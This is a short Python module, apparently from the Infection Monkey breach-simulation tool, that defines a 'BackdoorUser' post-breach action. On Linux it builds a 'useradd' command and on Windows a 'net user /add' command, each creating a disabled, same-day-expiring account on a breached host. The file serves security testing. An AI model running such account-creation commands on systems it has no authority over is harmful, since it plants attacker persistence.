import datetime

from common.data.post_breach_consts import POST_BREACH_BACKDOOR_USER
from infection_monkey.post_breach.pba import PBA
from infection_monkey.config import WormConfiguration

__author__ = 'danielg'

LINUX_COMMANDS = ['useradd', '-M', '--expiredate',
                  datetime.datetime.today().strftime('%Y-%m-%d'), '--inactive', '0', '-c', 'MONKEY_USER',
                  WormConfiguration.user_to_add]

WINDOWS_COMMANDS = ['net', 'user', WormConfiguration.user_to_add,
                    WormConfiguration.remote_user_pass,
                    '/add', '/ACTIVE:NO']


class BackdoorUser(PBA):
    def __init__(self):
        super(BackdoorUser, self).__init__(POST_BREACH_BACKDOOR_USER,
                                           linux_cmd=' '.join(LINUX_COMMANDS),
                                           windows_cmd=WINDOWS_COMMANDS)
